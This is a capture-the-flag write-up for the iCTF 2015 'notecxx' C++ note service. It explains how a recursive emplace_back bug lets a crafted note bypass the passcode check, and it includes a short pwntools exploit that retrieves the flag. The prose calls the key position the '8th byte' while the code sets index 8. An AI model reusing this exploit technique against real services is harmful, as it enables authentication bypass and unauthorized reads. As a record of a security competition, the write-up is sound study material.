# notecxx — iCTF 2015 "Crowdsourcing Evil"

**Competition:** iCTF 2015 (December 4–5, 2015)
**Category:** Binary Exploitation (C++ UB)
**Submitted by:** UCSB Seclab (crowdsourced service)
**Solved by:** DCIETS (full writeup preserved in `../../notecxx_writeup.md`)

---

## Overview

A C++ note-taking service where users write notes and issue commands to load/save them.
The service is unusual because issuing a `read` command normally also silently prepends
an `authenticate` command that requires matching a 64-bit passcode from file — making
reads impossible without the passcode.

---

## Vulnerability

The bug is **undefined behavior in recursive `std::vector::emplace_back`** (LLVM bug #16238).

In libstdc++ on Ubuntu 14.04, when `emplace_back` is called recursively from inside a
constructor that was itself triggered by `emplace_back`, both invocations believe they own
the same slot (vector size is incremented *after* constructor completion). The vector ends
up with two logical entries but only one was initialized — the second is uninitialized
memory.

The `commands.reserve(4)` call reuses a prior allocation chunk, so the uninitialized slot
contains whatever the previous string allocation left there. Specifically:

- Send a 34-byte note where the **8th byte is `'5'` (ASCII 53)**
- The uninitialized command slot's type byte is `0x35` = read_file opcode
- Then use `echo` with a 15-char string to trigger the recursive `emplace_back`
- Result: the `commands` vector contains only an echo command + a spurious `read_file`
  command — bypassing the authenticate check entirely

---

## Exploit

```python
import random
from pwn import *

def exploit(host, port, flag_id):
    char_array = ["a"] * 34
    char_array[8] = "5"

    p = remote(host, port)
    p.sendline("".join(char_array))   # craft the note
    p.sendline("cd %s" % flag_id)    # navigate to flag dir
    p.sendline("echo %s" % ("a" * 15))  # trigger spurious read
    p.shutdown()

    p.recvuntil("FLG")
    return "FLG" + p.recvline().strip()
```

---

## Historical Notes

- Source code is not preserved (crowdsourced service, original not archived).
- Full technical writeup by DCIETS is in `../../notecxx_writeup.md`.
- The exploit is OS-specific to Ubuntu 14.04 (glibc's malloc alignment behavior).
